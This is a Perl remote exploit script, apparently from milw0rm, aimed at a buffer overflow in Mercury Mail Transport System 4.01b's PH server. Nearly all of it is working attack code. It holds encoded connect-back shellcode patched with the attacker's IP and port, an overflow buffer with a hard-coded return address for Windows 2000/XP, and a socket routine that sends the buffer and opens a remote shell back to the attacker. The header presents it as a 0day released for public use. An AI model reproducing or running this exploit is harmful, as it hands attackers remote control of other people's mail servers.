### mercurysexywarez
### Okayokay THiS iS 0DAY!!!
### Mercury Mail Transport System 4.01b REMOTE ROOT EXPLOIT
### (PH SERVER)
### since me and my folks didn't find enough wild targets,
### i release this pretty warez to the public :PP
### kcope [kingcope(at)gmx.net] in 2005! JUUAREZ!
### Big thanx to blackzero,revoguard,qobaiashi,unf,secrew!
###################################################################
use IO::Socket;
# 316 bytes
$cbsc =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\xC2\xE2\xFA"
."\xEB\x05\xE8\xEB\xFF\xFF\xFF"
."\x2B\x39\xC2\xC2\xC2\x9D\xA6\x63\xF2\xC2\xC2\xC2\x49\x82\xCE\x49"
."\xB2\xDE\x6F\x49\xAA\xCA\x49\x35\xA8\xC6\x9B\x2A\x59\xC2\xC2\xC2"
."\x20\x3B\xAA\xF1\xF0\xC2\xC2\xAA\xB5\xB1\xF0\x9D\x96\x3D\xD4\x49"
."\x2A\xA8\xC6\x9B\x2A\x40\xC2\xC2\xC2\x20\x3B\x43\x2E\x52\xC3\xC2"
."\xC2\x96\xAA\xC3\xC3\xC2\xC2\x3D\x94\xD2\x92\x92\x92\x92\x82\x92"
."\x82\x92\x3D\x94\xD6\x49\x1A\xAA\xBD\xC2\xC2\xC3\xAA\xC0\xC2\xC2"
."\xF7\x49\x0E\xA8\xD2\x93\x91\x3D\x94\xDA\x47\x02\xB7\x88\xAA\xA1"
."\xAF\xA6\xC2\x4B\xA4\xF2\x41\x2E\x96\x4F\xFE\xE6\xA8\xD7\x9B\x69"
."\x20\x3F\x04\x86\xE6\xD2\x86\x3C\x86\xE6\xFF\x4B\x9E\xE6\x8A\x4B"
."\x9E\xE6\x8E\x4B\x9E\xE6\x92\x4F\x86\xE6\xD2\x96\x92\x93\x93\x93"
."\xA8\xC3\x93\x93\x3D\xB4\xF2\x93\x3D\x94\xC6\x49\x0E\xA8\x3D\x3D"
."\xF3\x3D\x94\xCA\x91\x3D\x94\xDE\x3D\x94\xCE\x93\x94\x49\x87\xFE"
."\x49\x96\xEA\xBA\xC1\x17\x90\x49\xB0\xE2\xC1\x37\xF1\x0B\x8B\x83"
."\x6F\xC1\x07\xF1\x19\xCD\x7C\xD2\xF8\x14\xB6\xCA\x03\x09\xCF\xC1"
."\x18\x82\x29\x33\xF9\xDD\xB7\x25\x98\x49\x98\xE6\xC1\x1F\xA4\x49"
."\xCE\x89\x49\x98\xDE\xC1\x1F\x49\xC6\x49\xC1\x07\x69\x9C\x9B\x01"
."\x2A\xC2\x3D\x3D\x3D\x4C\x8C\xCC\x2E\xB0\x3C\x71\xD4\x6F\x1B\xC7"
."\x0C\xBC\x1A\x20\xB1\x09\x2F\x3E\xF9\x1B\xCB\x37\x6F\x2E\x3B\x68"
."\xA2\x25\xBB\x04\xBB";

$numtargets = 1;

@targets =
(
 ["Mercury Mail Transport System 4.01b Win2k SP4/WinXP SP2", "\x83\xf2\x41\x00"]
);

print "Okayokay THiS iS 0DAY!!!\n";
print "Mercury Mail Transport System 4.01b REMOTE ROOT EXPLOIT\nkcope [kingcope(at)gmx.net] in 2005! JUUAREZ!\n";
print "Big thanx to blackzero,revoguard,qobaiashi,unf,secrew!\n";
if ($#ARGV ne 3) {
       print "usage: mecurysexywarez.pl target targettype yourip yourport\n\n";
   for ($i=0; $i<$numtargets; $i++) {
        print " [".$i."]...". $targets[$i][0]. "\n";
   }
       exit(0);
}

$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                             PeerPort => '105',
                             Proto    => 'tcp') || die("Oh my godess! Port not open! Pleeze open and try again :PP");
$tt=$ARGV[1];
$cbip=$ARGV[2];
$cbport=$ARGV[3];

($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));
$a1 = chr(ord($a1) ^ 0xc2);
$a2 = chr(ord($a2) ^ 0xc2);
$a3 = chr(ord($a3) ^ 0xc2);
$a4 = chr(ord($a4) ^ 0xc2);
substr($cbsc, 111, 4, $a1 . $a2 . $a3 . $a4);

($p1, $p2) = split(//, reverse(pack("s", $cbport)));
$p1 = chr(ord($p1) ^ 0xc2);
$p2 = chr(ord($p2) ^ 0xc2);
substr($cbsc, 118, 2, $p1 . $p2);

$pad="A" x 408 . $cbsc . "\x90\x90\xeb\x04";
$pad2="A" x 440;

$ret=$targets[$tt][1];
$x=$pad.$ret."JJJJKKKKLLLLMMMMNNNNOOOOPPPP\xe9\x87\xfe\xff\xff".$pad2;
print $sock "$x\r\n";

while (<$sock>) {
       print;
}

# milw0rm.com [2005-12-16]